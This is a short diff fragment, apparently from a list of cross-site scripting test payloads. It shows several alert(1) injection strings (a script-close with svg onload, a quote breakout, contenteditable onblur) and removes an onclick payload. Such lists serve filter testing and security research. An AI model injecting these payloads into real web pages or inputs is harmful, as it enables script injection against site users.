@@ -22,4 +22,3 @@
 \'-alert(1)//
 </script><svg onload=alert(1)>
 <x contenteditable onblur=alert(1)>lose focus! 
-<x onclick=alert(1)>click this! 
